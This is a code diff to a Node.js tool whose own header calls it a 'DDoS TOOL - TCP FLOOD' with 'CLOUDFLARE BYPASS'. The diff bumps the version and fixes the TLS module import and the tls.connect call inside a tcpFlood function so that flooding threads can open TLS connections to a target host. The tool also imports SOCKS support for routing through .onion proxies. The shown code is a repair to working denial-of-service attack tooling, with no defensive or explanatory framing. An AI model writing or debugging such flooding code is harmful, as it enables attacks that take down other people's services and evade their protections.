@@ -5,14 +5,14 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v8.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
+// * DDoS TOOL - TCP FLOOD - v9.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
 // Import required modules at the top
 const net = require('net');
 const crypto = require('crypto');
 const socks = require('socks').SocksClient; // Required for .onion support
-const tls = require('tls').TLSSocket; // Required for TLS/SSL
+const tls = require('tls'); // Required for TLS/SSL
 const https = require('https'); // Required for HTTPS proxy support
 const url = require('url');
 const dns = require('dns').promises;
@@ -342,7 +342,7 @@ async function tcpFlood(threadId) {
                                 port: port,
                                 rejectUnauthorized: false, // Allow self-signed certificates (for testing)
                             };
-                            socket = tls.connect(tlsOptions, () => {
+                            socket = tls.connect(port, targetHost, tlsOptions, () => {
                                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (TLS)${resetColor}`);
                                 resolve(socket);
                             });
